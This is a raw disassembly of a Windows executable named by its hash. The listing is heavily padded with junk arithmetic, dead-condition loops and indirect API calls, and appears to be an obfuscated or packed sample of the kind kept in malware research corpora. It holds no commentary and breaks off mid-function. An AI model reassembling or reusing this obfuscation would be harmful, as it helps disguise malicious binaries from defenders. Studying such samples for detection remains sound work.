
053f91231dd4e54135429307af1f22737bcec7373b369daeac9efaf7efd0b37d.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xe4
  401009:	push   edi
  40100a:	or     DWORD PTR ds:0x42b018,0x42d018
  401014:	push   0x42e3c7
  401019:	xor    edi,edi
  40101b:	add    DWORD PTR ds:0x42d000,0x42d008
  401025:	inc    edi
  401026:	adc    DWORD PTR ds:0x42901c,0x42c00c
  401030:	push   edi
  401031:	dec    DWORD PTR ds:0x42a018
  401037:	push   edi
  401038:	not    DWORD PTR ds:0x42901c
  40103e:	call   DWORD PTR ds:0x42e90f
  401044:	test   eax,eax
  401046:	je     0x40106f
  40104c:	lea    eax,[ebp-0x50]
  40104f:	push   eax
  401050:	adc    DWORD PTR ds:0x42c018,0x408c
  40105a:	call   DWORD PTR ds:0x42e927
  401060:	mov    DWORD PTR ds:0x42c010,0x701a
  40106a:	jmp    0x4025df
  40106f:	or     DWORD PTR ds:0x42a010,0x42901c
  401079:	push   esi
  40107a:	or     DWORD PTR ds:0x42c018,0x254e
  401084:	mov    esi,DWORD PTR ds:0x42e90b
  40108a:	sub    DWORD PTR ds:0x42c000,0x42b014
  401094:	push   0x8
  401096:	add    DWORD PTR ds:0x42c004,0x1529
  4010a0:	push   0x42e3d7
  4010a5:	sub    DWORD PTR ds:0x42b00c,0x42c010
  4010af:	call   esi
  4010b1:	test   eax,eax
  4010b3:	je     0x4010f0
  4010b9:	sub    DWORD PTR ds:0x429004,0x42c000
  4010c3:	lea    eax,[ebp-0x50]
  4010c6:	sub    DWORD PTR ds:0x429000,0x1be5
  4010d0:	push   eax
  4010d1:	sbb    DWORD PTR ds:0x42b000,0x42d010
  4010db:	call   DWORD PTR ds:0x42e927
  4010e1:	mov    DWORD PTR ds:0x42b000,0x51df
  4010eb:	jmp    0x4025de
  4010f0:	push   ebx
  4010f1:	mov    ebx,DWORD PTR ds:0x429028
  4010f7:	or     ebx,DWORD PTR ds:0x429008
  4010fd:	mov    DWORD PTR ds:0x429028,ebx
  401103:	mov    ebx,DWORD PTR ds:0x42e907
  401109:	add    DWORD PTR ds:0x429024,0x4675
  401113:	push   0x42e3e7
  401118:	or     DWORD PTR ds:0x42c008,0x42c018
  401122:	push   edi
  401123:	adc    DWORD PTR ds:0x42c014,0x42b014
  40112d:	push   edi
  40112e:	call   ebx
  401130:	and    DWORD PTR ds:0x429020,0x61d3
  40113a:	test   eax,eax
  40113c:	jne    0x40121c
  401142:	sbb    DWORD PTR ds:0x42c004,0x42b004
  40114c:	push   0xc
  40114e:	mov    DWORD PTR ds:0x42d004,0x2d3b
  401158:	push   0x42e40b
  40115d:	call   esi
  40115f:	inc    DWORD PTR ds:0x42c008
  401165:	test   eax,eax
  401167:	mov    DWORD PTR ds:0x42b010,0x1593
  401171:	jne    0x40121c
  401177:	sub    DWORD PTR ds:0x42d000,0x17f0
  401181:	push   0x7
  401183:	add    DWORD PTR ds:0x429024,0x2885
  40118d:	push   0x42e41f
  401192:	call   esi
  401194:	and    DWORD PTR ds:0x42d014,0x42c000
  40119e:	test   eax,eax
  4011a0:	mov    DWORD PTR ds:0x42c014,0x720
  4011aa:	jne    0x40121c
  4011b0:	or     DWORD PTR ds:0x42b004,0x42b01c
  4011ba:	push   0x8
  4011bc:	push   0x42e42f
  4011c1:	sbb    DWORD PTR ds:0x42d014,0x5687
  4011cb:	call   esi
  4011cd:	xor    DWORD PTR ds:0x429014,0x42b018
  4011d7:	test   eax,eax
  4011d9:	mov    DWORD PTR ds:0x42d008,0x6461
  4011e3:	jne    0x40121c
  4011e9:	mov    DWORD PTR ds:0x42a014,0x128
  4011f3:	push   0x42e43f
  4011f8:	push   edi
  4011f9:	push   edi
  4011fa:	adc    DWORD PTR ds:0x429020,0x42a000
  401204:	call   DWORD PTR ds:0x42e90f
  40120a:	test   eax,eax
  40120c:	mov    DWORD PTR ds:0x42a01c,0x679f
  401216:	je     0x401249
  40121c:	lea    eax,[ebp-0x50]
  40121f:	sub    DWORD PTR ds:0x42c004,0x42a000
  401229:	push   eax
  40122a:	adc    DWORD PTR ds:0x429024,0xd32
  401234:	call   DWORD PTR ds:0x42e927
  40123a:	mov    DWORD PTR ds:0x42d008,0x45e0
  401244:	jmp    0x4025dd
  401249:	sub    DWORD PTR ds:0x429004,0x429014
  401253:	push   0x42e44f
  401258:	push   edi
  401259:	and    DWORD PTR ds:0x42b00c,0x7ff1
  401263:	push   edi
  401264:	or     DWORD PTR ds:0x42d014,0x42c01c
  40126e:	call   ebx
  401270:	test   eax,eax
  401272:	mov    DWORD PTR ds:0x429028,0x42c
  40127c:	je     0x401766
  401282:	xor    DWORD PTR ds:0x42b01c,0x42a010
  40128c:	push   0xc
  40128e:	xor    DWORD PTR ds:0x42d00c,0x685
  401298:	push   0x42e473
  40129d:	and    DWORD PTR ds:0x42a01c,0x363a
  4012a7:	call   esi
  4012a9:	test   eax,eax
  4012ab:	mov    DWORD PTR ds:0x42b014,0x15a6
  4012b5:	jne    0x40175f
  4012bb:	mov    DWORD PTR ds:0x42b01c,0x5b0e
  4012c5:	push   0x7
  4012c7:	push   0x42e487
  4012cc:	call   esi
  4012ce:	test   eax,eax
  4012d0:	jne    0x40175f
  4012d6:	push   0x8
  4012d8:	push   0x42e497
  4012dd:	call   esi
  4012df:	or     DWORD PTR ds:0x42c018,0x5fc7
  4012e9:	test   eax,eax
  4012eb:	mov    DWORD PTR ds:0x42b01c,0x6bd8
  4012f5:	jne    0x40175f
  4012fb:	add    DWORD PTR ds:0x429000,0x429014
  401305:	push   0x42e4a7
  40130a:	push   edi
  40130b:	push   edi
  40130c:	xor    DWORD PTR ds:0x42d014,0x5ea1
  401316:	call   DWORD PTR ds:0x42e90f
  40131c:	sub    DWORD PTR ds:0x42901c,0x42c008
  401326:	test   eax,eax
  401328:	mov    DWORD PTR ds:0x42a004,0x3a7d
  401332:	jne    0x40175f
  401338:	push   0x42e4b7
  40133d:	and    DWORD PTR ds:0x42a004,0x429004
  401347:	push   edi
  401348:	or     DWORD PTR ds:0x42a01c,0x6055
  401352:	push   edi
  401353:	sub    DWORD PTR ds:0x429014,0x42b00c
  40135d:	call   ebx
  40135f:	xor    DWORD PTR ds:0x42b008,0x42a018
  401369:	test   eax,eax
  40136b:	mov    DWORD PTR ds:0x429014,0x3a80
  401375:	jne    0x40175f
  40137b:	or     DWORD PTR ds:0x42b00c,0x42b010
  401385:	push   0xc
  401387:	push   0x42e4db
  40138c:	call   esi
  40138e:	test   eax,eax
  401390:	jne    0x40175f
  401396:	mov    DWORD PTR ds:0x42900c,0x5e8c
  4013a0:	push   0x7
  4013a2:	push   0x42e4ef
  4013a7:	and    DWORD PTR ds:0x42b010,0x4122
  4013b1:	call   esi
  4013b3:	test   eax,eax
  4013b5:	mov    DWORD PTR ds:0x42a018,0x79ff
  4013bf:	jne    0x40175f
  4013c5:	push   0x8
  4013c7:	push   0x42e4ff
  4013cc:	call   esi
  4013ce:	test   eax,eax
  4013d0:	jne    0x40175f
  4013d6:	or     DWORD PTR ds:0x42a00c,0x42b01c
  4013e0:	push   0x42e50f
  4013e5:	sbb    DWORD PTR ds:0x42d004,0x5fa0
  4013ef:	push   edi
  4013f0:	and    DWORD PTR ds:0x42900c,0x42d00c
  4013fa:	push   edi
  4013fb:	add    DWORD PTR ds:0x42c010,0x54c5
  401405:	call   DWORD PTR ds:0x42e90f
  40140b:	mov    DWORD PTR ds:0x42b010,0x4d18
  401415:	test   eax,eax
  401417:	mov    DWORD PTR ds:0x42b018,0x69c2
  401421:	jne    0x40175f
  401427:	or     DWORD PTR ds:0x42c004,0x44f8
  401431:	push   0x42e51f
  401436:	add    DWORD PTR ds:0x42c004,0x42b01c
  401440:	push   edi
  401441:	adc    DWORD PTR ds:0x429004,0x4c2b
  40144b:	push   edi
  40144c:	call   ebx
  40144e:	test   eax,eax
  401450:	mov    DWORD PTR ds:0x42a008,0x516b
  40145a:	jne    0x40175f
  401460:	add    DWORD PTR ds:0x42d014,0x429018
  40146a:	push   0xc
  40146c:	push   0x42e543
  401471:	mov    DWORD PTR ds:0x42a004,0x58e8
  40147b:	call   esi
  40147d:	sbb    DWORD PTR ds:0x429028,0x2f15
  401487:	test   eax,eax
  401489:	jne    0x40175f
  40148f:	adc    DWORD PTR ds:0x42b000,0x4b6d
  401499:	push   0x7
  40149b:	sbb    DWORD PTR ds:0x42c014,0x42d004
  4014a5:	push   0x42e557
  4014aa:	or     DWORD PTR ds:0x42d008,0x1d0d
  4014b4:	call   esi
  4014b6:	xor    DWORD PTR ds:0x42c018,0xe1e
  4014c0:	test   eax,eax
  4014c2:	mov    DWORD PTR ds:0x42c010,0x6fc5
  4014cc:	jne    0x40175f
  4014d2:	push   0x8
  4014d4:	push   0x42e567
  4014d9:	add    DWORD PTR ds:0x42d000,0x42d018
  4014e3:	call   esi
  4014e5:	test   eax,eax
  4014e7:	jne    0x40175f
  4014ed:	push   0x42e577
  4014f2:	push   edi
  4014f3:	or     DWORD PTR ds:0x42d01c,0x429028
  4014fd:	push   edi
  4014fe:	call   DWORD PTR ds:0x42e90f
  401504:	test   eax,eax
  401506:	mov    DWORD PTR ds:0x42b018,0xe81
  401510:	jne    0x40175f
  401516:	or     DWORD PTR ds:0x42c00c,0x42b014
  401520:	push   0x42e587
  401525:	sub    DWORD PTR ds:0x42c004,0x429028
  40152f:	push   edi
  401530:	xor    DWORD PTR ds:0x42d010,0x42901c
  40153a:	push   edi
  40153b:	and    DWORD PTR ds:0x42d014,0x50c
  401545:	call   ebx
  401547:	test   eax,eax
  401549:	mov    DWORD PTR ds:0x42c008,0x6727
  401553:	jne    0x40175f
  401559:	push   0xc
  40155b:	adc    DWORD PTR ds:0x42a00c,0x1435
  401565:	push   0x42e5ab
  40156a:	mov    DWORD PTR ds:0x42c00c,0x3eef
  401574:	call   esi
  401576:	xor    DWORD PTR ds:0x42b014,0x10aa
  401580:	test   eax,eax
  401582:	mov    DWORD PTR ds:0x42a014,0x7a40
  40158c:	jne    0x40175f
  401592:	push   0x7
  401594:	adc    DWORD PTR ds:0x42b008,0x42a010
  40159e:	push   0x42e5bf
  4015a3:	or     DWORD PTR ds:0x42d004,0x42c014
  4015ad:	call   esi
  4015af:	add    DWORD PTR ds:0x42b008,0x42b014
  4015b9:	test   eax,eax
  4015bb:	mov    DWORD PTR ds:0x42c000,0x2197
  4015c5:	jne    0x40175f
  4015cb:	sub    DWORD PTR ds:0x42a004,0x42b008
  4015d5:	push   0x8
  4015d7:	sbb    DWORD PTR ds:0x42a000,0x42d01c
  4015e1:	push   0x42e5cf
  4015e6:	adc    DWORD PTR ds:0x42b00c,0x429010
  4015f0:	call   esi
  4015f2:	mov    DWORD PTR ds:0x42c004,0x76c3
  4015fc:	test   eax,eax
  4015fe:	mov    DWORD PTR ds:0x42901c,0x7b99
  401608:	jne    0x40175f
  40160e:	adc    DWORD PTR ds:0x42c008,0x42901c
  401618:	push   0x42e5df
  40161d:	push   edi
  40161e:	push   edi
  40161f:	call   DWORD PTR ds:0x42e90f
  401625:	adc    DWORD PTR ds:0x42a004,0x43e7
  40162f:	test   eax,eax
  401631:	jne    0x40175f
  401637:	sbb    DWORD PTR ds:0x42b00c,0x42c008
  401641:	push   0x42e5ef
  401646:	or     DWORD PTR ds:0x42d00c,0x67f5
  401650:	push   edi
  401651:	mov    DWORD PTR ds:0x42c008,0x11d2
  40165b:	push   edi
  40165c:	add    DWORD PTR ds:0x429024,0x35c0
  401666:	call   ebx
  401668:	adc    DWORD PTR ds:0x42a01c,0x475f
  401672:	test   eax,eax
  401674:	mov    DWORD PTR ds:0x42c010,0x9db
  40167e:	jne    0x40175f
  401684:	add    DWORD PTR ds:0x42b01c,0x42c010
  40168e:	push   0xc
  401690:	push   0x42e613
  401695:	call   esi
  401697:	test   eax,eax
  401699:	jne    0x40175f
  40169f:	push   0x7
  4016a1:	sub    DWORD PTR ds:0x42a010,0x42b00c
  4016ab:	push   0x42e627
  4016b0:	xor    DWORD PTR ds:0x42a000,0x46f8
  4016ba:	call   esi
  4016bc:	sub    DWORD PTR ds:0x429028,0x1e37
  4016c6:	test   eax,eax
  4016c8:	mov    DWORD PTR ds:0x429008,0x34bb
  4016d2:	jne    0x40175f
  4016d8:	adc    DWORD PTR ds:0x42d01c,0x42d008
  4016e2:	push   0x8
  4016e4:	neg    DWORD PTR ds:0x42d004
  4016ea:	push   0x42e637
  4016ef:	call   esi
  4016f1:	xor    DWORD PTR ds:0x429020,0x5303
  4016fb:	test   eax,eax
  4016fd:	jne    0x40175f
  401703:	sub    DWORD PTR ds:0x429014,0x42c01c
  40170d:	push   0x42e647
  401712:	not    DWORD PTR ds:0x429000
  401718:	push   edi
  401719:	or     DWORD PTR ds:0x42c01c,0x7461
  401723:	push   edi
  401724:	call   DWORD PTR ds:0x42e90f
  40172a:	test   eax,eax
  40172c:	mov    DWORD PTR ds:0x42901c,0x5bee
  401736:	jne    0x40175f
  40173c:	sbb    DWORD PTR ds:0x42c008,0x1a2b
  401746:	push   0x42e657
  40174b:	push   edi
  40174c:	neg    DWORD PTR ds:0x42b010
  401752:	push   edi
  401753:	sbb    DWORD PTR ds:0x42c000,0x42b008
  40175d:	call   ebx
  40175f:	xor    eax,eax
  401761:	jmp    0x4025dd
  401766:	mov    esi,DWORD PTR ds:0x41cde0
  40176c:	mov    eax,ds:0x41ce2c
  401771:	sub    eax,esi
  401773:	xor    esi,DWORD PTR [esi+eax*1]
  401776:	mov    DWORD PTR [ebp-0x10],0x0
  40177d:	mov    eax,DWORD PTR [ebp-0x34]
  401780:	mov    DWORD PTR [ebp-0x34],eax
  401783:	mov    ecx,0xf89c8585
  401788:	neg    edi
  40178a:	mov    DWORD PTR [ebp-0x8],ecx
  40178d:	mov    edx,DWORD PTR ds:0x42d018
  401793:	sub    edx,DWORD PTR ds:0x42b000
  401799:	mov    DWORD PTR ds:0x42d018,edx
  40179f:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4017a6:	xor    esi,esi
  4017a8:	add    esi,DWORD PTR ds:0x41cd71
  4017ae:	xor    edx,edx
  4017b0:	add    edx,DWORD PTR ds:0x41cdf8
  4017b6:	sub    esi,edx
  4017b8:	and    esi,DWORD PTR [esi+edx*1]
  4017bb:	lea    eax,[ebp-0x3c]
  4017be:	and    DWORD PTR ds:0x42c000,0x550f
  4017c8:	mov    DWORD PTR [ebp-0x30],eax
  4017cb:	mov    DWORD PTR ds:0x42a010,0x1f
  4017d5:	cmp    DWORD PTR ds:0x42a010,0x0
  4017dc:	je     0x40182a
  4017e2:	cmp    DWORD PTR ds:0x42a010,0x2a
  4017e9:	jne    0x401805
  4017ef:	push   DWORD PTR [ebp-0x10]
  4017f2:	push   0x7c9b
  4017f7:	push   0x511d
  4017fc:	push   DWORD PTR [ebp-0x1c]
  4017ff:	call   DWORD PTR ds:0x42e8e7
  401805:	mov    edx,DWORD PTR ds:0x42a010
  40180b:	dec    edx
  40180c:	mov    DWORD PTR ds:0x42a010,edx
  401812:	jmp    0x4017d5
  401817:	mov    edx,DWORD PTR ds:0x41cdd8
  40181d:	xor    edi,edi
  40181f:	xor    edi,DWORD PTR ds:0x41ce10
  401825:	sub    edi,edx
  401827:	add    edx,DWORD PTR [edx+edi*1]
  40182a:	lea    eax,[ebp-0x44]
  40182d:	mov    DWORD PTR [ebp-0x18],eax
  401830:	mov    edi,DWORD PTR ds:0x41ce2c
  401836:	mov    edx,DWORD PTR ds:0x41cd89
  40183c:	sub    edx,edi
  40183e:	imul   edi,DWORD PTR [edi+edx*1]
  401842:	mov    eax,ds:0x42e2b7
  401847:	movzx  edx,BYTE PTR ds:0x42a01c
  40184e:	and    edx,DWORD PTR ds:0x42c010
  401854:	mov    DWORD PTR ds:0x42a01c,edx
  40185a:	mov    eax,DWORD PTR [eax+0x1c8]
  401860:	mov    eax,DWORD PTR [eax]
  401862:	xor    edi,edi
  401864:	mov    edx,DWORD PTR [ebp-0x18]
  401867:	mov    esi,DWORD PTR ds:0x429028
  40186d:	and    DWORD PTR ds:0x42d004,esi
  401873:	mov    esi,0x751089b
  401878:	or     DWORD PTR ds:0x42900c,ebx
  40187e:	xor    eax,esi
  401880:	and    DWORD PTR ds:0x42b010,0x0
  40188a:	mov    edi,DWORD PTR ds:0x42b010
  401890:	inc    edi
  401891:	mov    DWORD PTR ds:0x42b010,edi
  401897:	cmp    DWORD PTR ds:0x42b010,0x25
  40189e:	jne    0x4018ba
  4018a4:	push   DWORD PTR [ebp-0x1c]
  4018a7:	push   DWORD PTR [ebp-0x10]
  4018aa:	push   0x42e000
  4018af:	push   0x400000
  4018b4:	call   DWORD PTR ds:0x42e8eb
  4018ba:	cmp    DWORD PTR ds:0x42b010,0x17
  4018c1:	jb     0x40188a
  4018c7:	mov    edi,0x3272e2
  4018cc:	add    eax,edi
  4018ce:	mov    DWORD PTR ds:0x42a010,0x30bc
  4018d8:	mov    DWORD PTR [edx],eax
  4018da:	mov    DWORD PTR ds:0x42c014,0x6382
  4018e4:	mov    eax,ds:0x42e753
  4018e9:	mov    DWORD PTR ds:0x429028,0x5397
  4018f3:	cmp    eax,0x312bc9f6
  4018f8:	jne    0x401986
  4018fe:	mov    eax,DWORD PTR [ebp-0x8]
  401901:	sub    DWORD PTR ds:0x42c004,edx
  401907:	mov    edx,DWORD PTR ds:0x42e2b7
  40190d:	mov    ebx,DWORD PTR ds:0x41ce24
  401913:	mov    ebx,DWORD PTR [ebx]
  401915:	adc    DWORD PTR ds:0x42a018,ebx
  40191b:	mov    edx,DWORD PTR [edx+0x198]
  401921:	xor    ebx,0x3fd0
  401927:	xor    eax,esi
  401929:	sbb    DWORD PTR ds:0x429010,0x42901c
  401933:	add    eax,edi
  401935:	or     DWORD PTR ds:0x42900c,edx
  40193b:	mov    DWORD PTR [edx],eax
  40193d:	mov    eax,DWORD PTR [ebp-0x8]
  401940:	and    DWORD PTR ds:0x42a014,0x0
  40194a:	mov    ebx,DWORD PTR ds:0x42a014
  401950:	inc    ebx
  401951:	mov    DWORD PTR ds:0x42a014,ebx
  401957:	cmp    DWORD PTR ds:0x42a014,0x20
  40195e:	jne    0x40196a
  401964:	call   DWORD PTR ds:0x42e8ef
  40196a:	cmp    DWORD PTR ds:0x42a014,0x1c
  401971:	jb     0x40194a
  401977:	xor    eax,esi
  401979:	add    eax,edi
  40197b:	add    DWORD PTR ds:0x42d00c,ebx
  401981:	mov    ds:0x42e753,eax
  401986:	mov    eax,ds:0x42e2b7
  40198b:	and    DWORD PTR ds:0x42c014,0x7897
  401995:	mov    eax,DWORD PTR [eax+0x18c]
  40199b:	or     DWORD PTR ds:0x42d004,0x42d014
  4019a5:	mov    eax,DWORD PTR [eax]
  4019a7:	sbb    ebx,0x2d4c
  4019ad:	mov    DWORD PTR [ebp-0x7c],eax
  4019b0:	sbb    DWORD PTR ds:0x42c008,edx
  4019b6:	mov    ebx,0xf89c85b9
  4019bb:	neg    eax
  4019bd:	mov    DWORD PTR [ebp-0x10],ebx
  4019c0:	and    DWORD PTR ds:0x42c000,0x0
  4019ca:	mov    eax,ds:0x42c000
  4019cf:	inc    eax
  4019d0:	mov    ds:0x42c000,eax
  4019d5:	cmp    DWORD PTR ds:0x42c000,0xa
  4019dc:	jne    0x4019e8
  4019e2:	call   DWORD PTR ds:0x42e8f3
  4019e8:	cmp    DWORD PTR ds:0x42c000,0x9
  4019ef:	jne    0x401a00
  4019f5:	mov    eax,ds:0x42c000
  4019fa:	inc    eax
  4019fb:	mov    ds:0x42c000,eax
  401a00:	cmp    DWORD PTR ds:0x42c000,0x15
  401a07:	jb     0x4019ca
  401a0d:	movzx  eax,WORD PTR ds:0x42c00c
  401a14:	and    eax,DWORD PTR ds:0x42c018
  401a1a:	mov    ds:0x42c00c,eax
  401a1f:	mov    DWORD PTR [ebp-0x10],ebx
  401a22:	sub    DWORD PTR ds:0x42b004,ecx
  401a28:	mov    DWORD PTR [ebp-0x10],ebx
  401a2b:	mov    DWORD PTR [ebp-0x18],ecx
  401a2e:	mov    DWORD PTR [ebp-0x10],ebx
  401a31:	dec    DWORD PTR ds:0x42c014
  401a37:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  401a3e:	mov    eax,ds:0x42a010
  401a43:	adc    DWORD PTR ds:0x42b00c,eax
  401a49:	mov    eax,DWORD PTR [ebp-0x8]
  401a4c:	add    DWORD PTR ds:0x42a004,0x42901c
  401a56:	xor    eax,esi
  401a58:	add    eax,edi
  401a5a:	mov    DWORD PTR ds:0x42d00c,0x4361
  401a64:	jmp    0x401b08
  401a69:	and    eax,ecx
  401a6b:	mov    eax,DWORD PTR [ebp-0xc]
  401a6e:	mov    ecx,DWORD PTR [ebp-0x1c]
  401a71:	sbb    DWORD PTR ds:0x42d01c,0x38e1
  401a7b:	xor    eax,esi
  401a7d:	or     DWORD PTR ds:0x42b008,0x32de
  401a87:	lea    eax,[eax+ecx*1+0x3272e2]
  401a8e:	or     DWORD PTR ds:0x42900c,0x42c014
  401a98:	push   eax
  401a99:	mov    eax,DWORD PTR [ebp-0x18]
  401a9c:	mov    DWORD PTR ds:0x42b000,0x3f7a
  401aa6:	xor    eax,esi
  401aa8:	adc    DWORD PTR ds:0x42a000,0x429018
  401ab2:	lea    eax,[ebp+eax*1+0x3272ea]
  401ab9:	or     DWORD PTR ds:0x429000,0x42d01c
  401ac3:	push   eax
  401ac4:	sbb    eax,DWORD PTR ds:0x429000
  401aca:	mov    eax,ds:0x42e2b7
  401acf:	push   DWORD PTR [eax+0x1bc]
  401ad5:	and    DWORD PTR ds:0x42d014,0x65ae
  401adf:	call   0x4025f2
  401ae4:	mov    eax,DWORD PTR [ebp-0xc]
  401ae7:	or     edx,0x44
  401aed:	mov    ecx,DWORD PTR [ebp-0x1c]
  401af0:	neg    edx
  401af2:	xor    eax,esi
  401af4:	movzx  edx,BYTE PTR ds:0x42d000
  401afb:	add    DWORD PTR ds:0x429008,edx
  401b01:	lea    eax,[ecx+eax*1+0x3272e2]
  401b08:	mov    ecx,DWORD PTR [ebp-0xc]
  401b0b:	sbb    DWORD PTR ds:0x42900c,0x42c010
  401b15:	mov    edx,DWORD PTR [ebp-0xc]
  401b18:	sbb    DWORD PTR ds:0x42c00c,0x3f25
  401b22:	xor    edx,esi
  401b24:	xor    DWORD PTR ds:0x42901c,0x360b
  401b2e:	xor    ecx,esi
  401b30:	add    ecx,edx
  401b32:	mov    edx,DWORD PTR [ebp-0xc]
  401b35:	xor    edx,esi
  401b37:	lea    ecx,[ecx+edx*1+0x9758a6]
  401b3e:	mov    DWORD PTR ds:0x429010,0x1f54
  401b48:	mov    DWORD PTR [ebp-0x1c],eax
  401b4b:	cmp    eax,ecx
  401b4d:	jbe    0x401a69
  401b53:	mov    eax,ds:0x429020
  401b58:	adc    DWORD PTR ds:0x42901c,eax
  401b5e:	mov    eax,DWORD PTR [ebp+0xc]
  401b61:	mov    ecx,DWORD PTR ds:0x41cd6d
  401b67:	mov    ecx,DWORD PTR [ecx]
  401b69:	or     DWORD PTR ds:0x429028,ecx
  401b6f:	mov    ds:0x42e13b,eax
  401b74:	mov    ecx,DWORD PTR ds:0x429000
  401b7a:	or     DWORD PTR ds:0x42c008,ecx
  401b80:	mov    eax,DWORD PTR [ebp+0x10]
  401b83:	and    DWORD PTR ds:0x42b01c,0x0
  401b8d:	jmp    0x401b9f
  401b92:	mov    ecx,DWORD PTR ds:0x42b01c
  401b98:	inc    ecx
  401b99:	mov    DWORD PTR ds:0x42b01c,ecx
  401b9f:	cmp    DWORD PTR ds:0x42b01c,0x11
  401ba6:	jae    0x401bd3
  401bac:	cmp    DWORD PTR ds:0x42b01c,0x16
  401bb3:	jne    0x401bc4
  401bb9:	push   0x42e0f6
  401bbe:	call   DWORD PTR ds:0x42e8f7
  401bc4:	jmp    0x401b92
  401bc9:	mov    DWORD PTR ds:0x42a018,0x900
  401bd3:	mov    ds:0x42e38f,eax
  401bd8:	adc    DWORD PTR ds:0x42d008,0x597
  401be2:	mov    eax,ds:0x42e13b
  401be7:	mov    DWORD PTR ds:0x42901c,0x19
  401bf1:	cmp    DWORD PTR ds:0x42901c,0x0
  401bf8:	je     0x401c2a
  401bfe:	cmp    DWORD PTR ds:0x42901c,0x23
  401c05:	jne    0x401c16
  401c0b:	push   0x42e075
  401c10:	call   DWORD PTR ds:0x42e8fb
  401c16:	mov    ecx,DWORD PTR ds:0x42901c
  401c1c:	dec    ecx
  401c1d:	mov    DWORD PTR ds:0x42901c,ecx
  401c23:	jmp    0x401bf1
  401c28:	neg    ecx
  401c2a:	mov    ecx,DWORD PTR [ebp-0x30]
  401c2d:	sub    eax,edi
  401c2f:	xor    eax,esi
  401c31:	mov    DWORD PTR [ecx],eax
  401c33:	mov    eax,DWORD PTR [ebp-0x34]
  401c36:	mov    DWORD PTR ds:0x42c014,0x2861
  401c40:	cmp    eax,0xf89c8585
  401c45:	jne    0x401f18
  401c4b:	lea    eax,[ebp-0x48]
  401c4e:	mov    DWORD PTR [ebp-0x9c],eax
  401c54:	lea    eax,[ebp+0x4]
  401c57:	or     DWORD PTR ds:0x42d000,0x2377
  401c61:	mov    DWORD PTR [ebp-0x48],eax
  401c64:	xor    DWORD PTR ds:0x42a018,ecx
  401c6a:	mov    eax,DWORD PTR [ebp-0x48]
  401c6d:	test   eax,eax
  401c6f:	mov    DWORD PTR ds:0x42c00c,0x1657
  401c79:	je     0x4025c2
  401c7f:	mov    eax,DWORD PTR [ebp-0x24]
  401c82:	mov    eax,DWORD PTR [ebp-0xc]
  401c85:	sbb    eax,ecx
  401c87:	mov    eax,DWORD PTR [ebp-0x8]
  401c8a:	or     ecx,DWORD PTR ds:0x42c018
  401c90:	mov    DWORD PTR [ebp+0xc],eax
  401c93:	xor    DWORD PTR ds:0x42a014,edi
  401c99:	mov    eax,eax
  401c9b:	sub    DWORD PTR ds:0x42c000,0x352b
  401ca5:	mov    eax,ds:0x42e2b7
  401caa:	mov    DWORD PTR ds:0x42b014,0x12
  401cb4:	cmp    DWORD PTR ds:0x42b014,0x0
  401cbb:	je     0x401d04
  401cc1:	cmp    DWORD PTR ds:0x42b014,0x7
  401cc8:	jne    0x401cd4
  401cce:	call   DWORD PTR ds:0x42e8ff
  401cd4:	cmp    DWORD PTR ds:0x42b014,0x8
  401cdb:	jne    0x401cf0
  401ce1:	xor    ecx,ecx
  401ce3:	add    ecx,DWORD PTR ds:0x42b014
  401ce9:	dec    ecx
  401cea:	mov    DWORD PTR ds:0x42b014,ecx
  401cf0:	xor    ecx,ecx
  401cf2:	xor    ecx,DWORD PTR ds:0x42b014
  401cf8:	dec    ecx
  401cf9:	mov    DWORD PTR ds:0x42b014,ecx
  401cff:	jmp    0x401cb4
  401d04:	mov    eax,DWORD PTR [eax+0x1c8]
  401d0a:	mov    eax,DWORD PTR [eax]
  401d0c:	mov    DWORD PTR ds:0x429004,0x1d
  401d16:	cmp    DWORD PTR ds:0x429004,0x0
  401d1d:	je     0x401d6d
  401d23:	cmp    DWORD PTR ds:0x429004,0x4
  401d2a:	jne    0x401d41
  401d30:	push   DWORD PTR [ebp-0x28]
  401d33:	push   0x42d000
  401d38:	push   DWORD PTR [ebp-0xc]
  401d3b:	call   DWORD PTR ds:0x42e903
  401d41:	cmp    DWORD PTR ds:0x429004,0x5
  401d48:	jne    0x401d5b
  401d4e:	mov    ecx,DWORD PTR ds:0x429004
  401d54:	dec    ecx
  401d55:	mov    DWORD PTR ds:0x429004,ecx
  401d5b:	mov    ecx,DWORD PTR ds:0x429004
  401d61:	dec    ecx
  401d62:	mov    DWORD PTR ds:0x429004,ecx
  401d68:	jmp    0x401d16
  401d6d:	cdq    
  401d6e:	inc    ecx
  401d6f:	mov    ebx,eax
  401d71:	mov    ecx,DWORD PTR ds:0x42b008
  401d77:	adc    ecx,DWORD PTR ds:0x42b000
  401d7d:	mov    DWORD PTR ds:0x42b008,ecx
  401d83:	mov    eax,0xfabdbee7
  401d88:	and    DWORD PTR ds:0x429014,edi
  401d8e:	add    ebx,eax
  401d90:	mov    DWORD PTR ds:0x42c004,0x916
  401d9a:	adc    edx,0xffffffff
  401d9d:	and    DWORD PTR [ebp-0x10],0x0
  401da1:	or     DWORD PTR ds:0x42b018,0x42d014
  401dab:	xor    edx,0x0
  401dae:	mov    DWORD PTR [ebp-0x6c],edx
  401db1:	adc    DWORD PTR ds:0x42d008,ebx
  401db7:	mov    edx,DWORD PTR [ebp+0xc]
  401dba:	sbb    DWORD PTR ds:0x429004,edi
  401dc0:	mov    DWORD PTR [ebp-0x14],edx
  401dc3:	mov    ecx,0x8a29a12d
  401dc8:	add    edx,0x36ec
  401dce:	xor    ebx,ecx
  401dd0:	add    DWORD PTR [ebp-0x14],eax
  401dd3:	mov    DWORD PTR ds:0x42901c,ebx
  401dd9:	mov    edx,DWORD PTR [ebp-0x14]
  401ddc:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401de0:	xor    edx,ecx
  401de2:	mov    DWORD PTR [ebp-0x5c],edx
  401de5:	or     DWORD PTR ds:0x42a00c,edi
  401deb:	mov    edx,DWORD PTR [ebp-0x10]
  401dee:	xor    DWORD PTR ds:0x42d00c,0x42c018
  401df8:	xor    edx,0x0
  401dfb:	mov    DWORD PTR [ebp-0x58],edx
  401dfe:	mov    DWORD PTR ds:0x42900c,0x40f4
  401e08:	cmp    DWORD PTR [ebp-0x5c],ebx
  401e0b:	mov    DWORD PTR ds:0x42a004,0x5ee8
  401e15:	jne    0x401e3b
  401e1b:	mov    DWORD PTR ds:0x42b004,0x3032
  401e25:	mov    edx,DWORD PTR [ebp-0x6c]
